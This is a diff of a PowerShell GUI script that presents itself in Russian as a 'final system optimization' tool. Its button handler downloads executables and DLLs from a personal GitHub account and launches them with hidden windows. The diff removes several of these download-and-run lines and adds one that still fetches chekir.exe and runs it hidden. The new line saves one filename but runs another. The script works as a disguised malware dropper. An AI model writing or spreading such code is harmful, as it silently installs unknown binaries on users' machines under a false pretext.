@@ -218,26 +218,11 @@ $scan = {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -OutFile "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
+    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe" -OutFile "chekir.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
     
     # Запускаем
-    Start-Process -FilePath "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -WindowStyle Hidden
-    
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
-    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.dll" -OutFile "chekir.dll"; .\chekir.dll
-    
-    # Запускаем 
     Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
-    Start-Process -FilePath "chekir.dll" -WindowStyle Hidden
-   
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
-    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.dll" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
-    Start-Process -FilePath "Fx.dll" -WindowStyle Hidden
+  
     
     # Удаляем файл через 5 секунды
     Log "╔══════════════════════════════════════════════════════════════╗" "Cyan"
@@ -254,6 +239,7 @@ $btn.Add_Click($scan)
 
 # Запуск
 [void]$form.ShowDialog()
+
 
 
 
